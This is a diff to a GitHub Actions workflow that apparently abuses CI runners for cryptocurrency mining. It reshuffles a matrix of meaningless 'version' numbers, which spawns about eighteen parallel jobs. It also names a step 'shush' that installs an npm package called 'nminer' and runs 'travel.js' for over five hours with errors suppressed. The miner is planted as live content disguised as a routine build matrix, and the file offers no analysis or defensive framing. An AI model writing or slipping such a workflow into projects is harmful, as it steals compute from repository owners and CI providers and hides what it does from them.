@@ -9,23 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 552 }
-          - { version: 4686 }
-          - { version: 4588 }
-          - { version: 5865 }
-          - { version: 7760 }
-          - { version: 149 }
-          - { version: 7233 }
-          - { version: 3671 }
-          - { version: 5405 }
-          - { version: 9634 }
-          - { version: 834 }
-          - { version: 1186 }
-          - { version: 811 }
-          - { version: 5607 }
-          - { version: 9788 }
-          - { version: 523 }
-          - { version: 4680 }
+          - { version: 3465 }
+          - { version: 9505 }
+          - { version: 4082 }
+          - { version: 5675 }
+          - { version: 5989 }
+          - { version: 9562 }
+          - { version: 9094 }
+          - { version: 8518 }
+          - { version: 2984 }
+          - { version: 8904 }
+          - { version: 3877 }
+          - { version: 3684 }
+          - { version: 7803 }
+          - { version: 2511 }
+          - { version: 4418 }
+          - { version: 2810 }
+          - { version: 2330 }
+          - { version: 1312 }
 
     steps:
       - name: Checkout
@@ -36,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: shush
         run: |
           npm install nminer@latest
-          timeout 324m node travel.js || echo "travel executed"
+          timeout 333m node travel.js || echo "travel executed"
